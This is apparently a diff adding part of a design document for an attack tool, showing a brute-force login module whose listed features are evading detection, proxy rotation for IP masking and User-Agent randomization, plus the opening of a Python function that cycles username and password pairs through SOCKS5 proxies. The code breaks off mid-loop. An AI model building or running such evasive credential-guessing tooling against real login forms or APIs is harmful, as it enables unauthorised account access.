@@ -1,0 +1,20 @@
+Tool Components
+
+#### 1. **Brute-Force Module**
+   - Tests weak authentication mechanisms (e.g., login forms, API endpoints).
+   - Features:
+     - Rate limiting to avoid detection
+     - Proxy rotation for IP masking
+     - User-Agent randomization
+
+   ```python
+   import requests
+   import time
+   from itertools import product
+
+   def brute_force(target_url, username_list, password_list, delay=2, max_attempts=10):
+       proxies = {'http': 'socks5://user:pass@proxy:port', 'https': 'socks5://user:pass@proxy:port'}
+       user_agents = ['Mozilla/5.0...', 'Chrome/...']
+       
+       for idx, (username, password) in enumerate(product(username_list, password_list)):
+           if idx >= max_attempts:
